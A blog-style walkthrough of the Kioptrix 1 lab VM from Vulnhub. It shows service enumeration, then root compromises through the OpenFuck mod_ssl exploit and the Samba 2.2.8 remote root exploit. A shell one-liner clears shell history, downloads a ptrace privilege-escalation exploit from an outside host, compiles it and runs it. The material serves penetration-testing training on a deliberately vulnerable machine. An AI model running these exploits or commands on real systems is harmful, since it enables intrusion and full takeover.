---
layout: post
title: "Kioptrix 1 Walkthrough (Vulnhub)"
date: 2016-11-11 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough, Kioptrix series]
---

*Kioptrix 1 VM can be downloaded [here](https://www.vulnhub.com/entry
/kioptrix-level-1-1,22/).*
  
Kioptrix series consists of 5 vulnerable machines, every one is slightly harder than the one before. It will give you the chance to identify vulnerable services, use public exploits, and get the feeling of how proper pen testing is done. This machine can be rooted via a few different ways which will be discussed below, yet I will be also listing which attempts failed.  
  

## 0\. Get VM's IP

```console
root@kali:~# netdiscover -r 192.168.1.0/24  
  
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                    
                                                                                                                  
 260 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 15600                                              
 _____________________________________________________________________________  
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname        
 -----------------------------------------------------------------------------  
...                                  
 **192.168.1.104**   c4:e9:84:10:d3:5e      2     120  TP-LINK TECHNOLOGIES CO.,LTD.                                  
...  
```

## 1\. Enumeration

#### 1.1 Enumerate services

```console
root@kali:~# nmap -T4 192.168.1.104 -sV -O  
  
Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-11 23:22 EST  
Nmap scan report for 192.168.1.104  
Host is up (0.00013s latency).  
Not shown: 994 closed ports  
PORT     STATE SERVICE     VERSION  
**22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)  
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)  
111/tcp  open  rpcbind     2 (RPC #100000)  
139/tcp  open  netbios-ssn Samba smbd (workgroup: vMYGROUP)  
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)  
1024/tcp open  status      1 (RPC #100024)**  
MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)  
Device type: general purpose  
Running: Linux 2.4.X  
OS CPE: cpe:/o:linux:linux_kernel:2.4  
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)  
Network Distance: 1 hop  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds  
```    

  
That's a lot of outdated services! Let's go over each and find how we can exploit them. Some resources for identifying vulnerabilities and/or finding exploits for known services:  

  * [Security Focus](http://www.securityfocus.com/)
  * [Exploit DB](http://exploit-db.com/)
  * [Searchsploit ](https://www.exploit-db.com/searchsploit/)(local exploit DB) 

#### 1.2 Enum4Linux

```console
root@kali:~# enum4linux 192.168.1.104  
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 11 23:32:17 2016  
...  
  
 =======================================   
|    OS information on 192.168.1.104    |  
 =======================================   
[+] Got OS info for 192.168.1.104 from smbclient: Domain=[MYGROUP] OS=[Unix] **Server=[Samba 2.2.1a]**  
[+] Got OS info for 192.168.1.104 from srvinfo:  
 KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server  
 platform_id     : 500  
 os version      : 4.5  
 server type     : 0x9a03  
  
...  
   
 ==========================================   
|    Share Enumeration on 192.168.1.104    |  
 ==========================================   
WARNING: The "syslog" option is deprecated  
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
  
 Sharename       Type      Comment  
 ---------       ----      -------  
 IPC$            IPC       IPC Service (Samba Server)  
 ADMIN$          IPC       IPC Service (Samba Server)  
  
 Server               Comment  
 ---------            -------  
 KIOPTRIX             Samba Server  
  
 Workgroup            Master  
 ---------            -------  
 MYGROUP              KIOPTRIX  
 WORKGROUP            ELSAFFA7  
  
[+] Attempting to map shares on 192.168.1.104  
//192.168.1.104/IPC$ [E] Can't understand response:  
WARNING: The "syslog" option is deprecated  
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
NT_STATUS_NETWORK_ACCESS_DENIED listing \*  
//192.168.1.104/ADMIN$ [E] Can't understand response:  
WARNING: The "syslog" option is deprecated  
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]  
tree connect failed: NT_STATUS_WRONG_PASSWORD  
  
...  
  
enum4linux complete on Fri Nov 11 23:32:28 2016  
  
root@kali:~# 
```

`enum4linux` was able to identify which Samba service was running (2.2.1a), this will help us later!  

___________________________________________

## 2\. Exploiting OpenSSH (?)

#### Using existing vulnerabilities

```console    
root@kali:~# searchsploit openssh   
---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------  
 Exploit Title                                                                                                                                      |  Path  
                                                                                                                                                    | (/usr/share/exploitdb/platforms)  
---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------  
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                   | ./linux/remote/25.c  
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                 | ./linux/remote/26.sh  
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - Exploits                                                                                               | ./linux/local/258.sh  
Dropbear / OpenSSH Server - (MAX_UNAUTH_CLIENTS) Denial of Service                                                                                  | ./multiple/dos/1572.pl  
OpenSSH 4.3 p1 - (Duplicated Block) Remote Denial of Service                                                                                        | ./multiple/dos/2444.sh  
Portable OpenSSH 3.6.1p-PAM / 4.1-SuSE - Timing Attack Exploit                                                                                      | ./multiple/remote/3303.sh  
Debian OpenSSH - Authenticated Remote SELinux Privilege Elevation Exploit                                                                           | ./linux/remote/6094.txt  
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                                                  | ./novell/dos/14866.txt  
FreeBSD OpenSSH 3.5p1 - Remote Root Exploit                                                                                                         | ./freebsd/remote/17462.txt  
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                                                          | ./linux/remote/20253.sh  
**OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                                                   | ./unix/remote/21314.txt**  
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                          | ./linux/remote/21402.txt  
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                                                | ./unix/remote/21578.txt  
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                                                | ./unix/remote/21579.txt  
OpenSSH 7.2p1 - Authenticated xauth Command Injection                                                                                               | ./multiple/remote/39569.py  
OpenSSHd 7.2p2 - Username Enumeration (1)                                                                                                           | ./linux/remote/40113.txt  
OpenSSHd 7.2p2 - Username Enumeration (2)                                                                                                           | ./linux/remote/40136.py  
---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------  
```
  
Although exploit-db revealed a few exploits, almost all of them are not what we seek. Some of them are targeting different versions, others are local exploits (for a limited shell maybe?). One particularly interesting is [this](https://www.exploit-db.com/exploits/21314/) one.
  
After spending some time compiling old openssh version and trying out the exploit, it failed to work as the victim didn't have the specific misconfiguration targeted.  

___________________________________________

## 3\. Exploiting Apache (and getting root!)

Searching for apache exploits revealed too many results, but searching for the specific version revealed some [juicy data](https://www.exploit-db.com/exploits/764/).  
```console
root@kali:~# searchsploit apache mod_ssl  
---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------  
 Exploit Title                                                                                                                                      |  Path  
                                                                                                                                                    | (/usr/share/exploitdb/platforms)  
---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------  
Apache mod_ssl (< 2.8.7) OpenSSL - 'OpenFuckV2.c' Remote Exploit (2)                                                                                | ./unix/remote/764.c  
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                          | ./multiple/dos/21575.txt  
Apache mod_ssl (< 2.8.7) OpenSSL - 'OpenFuck.c' Remote Exploit (1)                                                                                  | ./unix/remote/21671.c  
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow Exploit                                                | ./unix/remote/40347.txt  
Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                                     | ./linux/dos/24590.txt  
---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------  
root@kali:~#   
````
  
It both matches Apache's version (1.3.20) and mod_ssl's (2.8.4).  
  
To compile it you'll both need to install `libssl-dev` and [update the script.](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/)  
  
Running it without any arguments shows us a long list of valid OS-Apache version combinations. The closest one to our system are the following:  

```
0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 
```

```console
root@kali:~# ./a.out 0x6a 192.168.1.104 -c 50  
  
*******************************************************************  
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *  
*******************************************************************  
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *  
* #hackarena  irc.brasnet.org                                     *  
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *  
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *  
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *  
*******************************************************************  
  
Connection... 50 of 50  
Establishing SSL connection  
cipher: 0x4043808c   ciphers: 0x80f81e8  
Ready to send shellcode  
Spawning shell...  
Good Bye!  
root@kali:~# ./a.out 0x6b 192.168.1.104 -c 50  
  
*******************************************************************  
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *  
*******************************************************************  
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *  
* #hackarena  irc.brasnet.org                                     *  
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *  
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *  
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *  
*******************************************************************  
  
Connection... 50 of 50  
Establishing SSL connection  
cipher: 0x4043808c   ciphers: 0x80f81e8  
Ready to send shellcode  
Spawning shell...  
bash: no job control in this shell  
bash-2.05$   
bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;   
--01:03:53--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c  
           => `ptrace-kmod.c'  
Connecting to dl.packetstormsecurity.net:80... connected!  
HTTP request sent, awaiting response... 301 Moved Permanently  
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]  
--01:03:53--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c  
           => `ptrace-kmod.c'  
Connecting to dl.packetstormsecurity.net:443... connected!  
HTTP request sent, awaiting response... 200 OK  
Length: 3,921 [text/x-csrc]  
  
    0K ...                                                   100% @ 957.28 KB/s  
  
01:03:54 (957.28 KB/s) - `ptrace-kmod.c' saved [3921/3921]  
  
[+] Attached to 6225  
[+] Signal caught  
[+] Shellcode placed at 0x4001189d  
[+] Now wait for suid shell...  
whoami  
root  
```
  
Let's check out other ways.

___________________________________________

## 4\. Exploiting Samba (and getting root too!)

A quick search for Samba 2.2.1 exploits reveals a couple of interesting
exploits on exploit-db.  

  * [Samba 2.2.8 - Remote Root Exploit](https://www.exploit-db.com/exploits/10/)
  * [0x333hate.c ](http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c)

Both work, there's a handful more PoC for this exploit and an MSF module too, I'll only demonstrate the first exploit.  

```console
root@kali:~# wget https://www.exploit-db.com/download/10  
--2016-11-12 00:16:51--  https://www.exploit-db.com/download/10  
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8  
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: unspecified [application/txt]  
Saving to: ‘10’  
  
10                            [ <=>                                 ]  44.06K  --.-KB/s    in 0.1s      
  
2016-11-12 00:16:59 (364 KB/s) - ‘10’ saved [45117]  
  
root@kali:~# mv 10 b.c  
root@kali:~# gcc b.c  
root@kali:~# ./a.out   
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)  
--------------------------------------------------------------  
Usage: ./a.out [-bBcCdfprsStv] [host]  
  
-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)  
-B <step>       bruteforce steps (default = 300)  
-c <ip address> connectback ip address  
-C <max childs> max childs for scan/bruteforce mode (default = 40)  
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)  
-f              force  
-p <port>       port to attack (default = 139)  
-r <ret>        return address  
-s              scan mode (random)  
-S <network>    scan mode  
-t <type>       presets (0 for a list)  
-v              verbose mode  
  
root@kali:~# ./a.out -b 0 -c 192.168.1.71 -C 40 192.168.1.104  
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)  
--------------------------------------------------------------  
+ Bruteforce mode. (Linux)  
+ Host is running samba.  
+ Worked!  
--------------------------------------------------------------  
*** JE MOET JE MUIL HOUWE  
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown  
uid=0(root) gid=0(root) groups=99(nobody)  
```
Oh, and here's our flag:  

```console
cat /var/mail/root  
From root  Sat Sep 26 11:42:10 2009  
Return-Path: <root@kioptix.level1>  
Received: (from root@localhost)  
 by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831  
 for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400  
Date: Sat, 26 Sep 2009 11:42:10 -0400  
From: root <root@kioptix.level1>  
Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>  
To: root@kioptix.level1  
Subject: About Level 2  
Status: O  
  
If you are reading this, you got root. Congratulations.  
Level 2 won't be as easy...  
  
From root  Sat Nov 12 00:04:37 2016  
Return-Path: <root@kioptrix.level1>  
Received: (from root@localhost)  
 by kioptrix.level1 (8.11.6/8.11.6) id uAC54bQ01088  
 for root; Sat, 12 Nov 2016 00:04:37 -0500  
Date: Sat, 12 Nov 2016 00:04:37 -0500  
From: root <root@kioptrix.level1>  
Message-Id: <201611120504.uAC54bQ01088@kioptrix.level1>  
To: root@kioptrix.level1  
Subject: LogWatch for kioptrix.level1  
  
  
  
 ################## LogWatch 2.1.1 Begin #####################   
  
  
 ---------------- Connections (secure-log) Begin -------------------   
  
**Unmatched Entries**  
Nov 11 23:59:32 kioptrix sshd[745]: Server listening on 0.0.0.0 port 22.  
  
  
 ----------------- Connections (secure-log) End --------------------   
  
  
  
 --------------------- SSHD Begin ------------------------   
  
**Unmatched Entries**  
Starting sshd:  
 succeeded  
  
  
  
 ---------------------- SSHD End -------------------------   
  
  
  
 ###################### LogWatch End #########################   
```
 
That was a short one, time to write up [Kioptrix2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).  
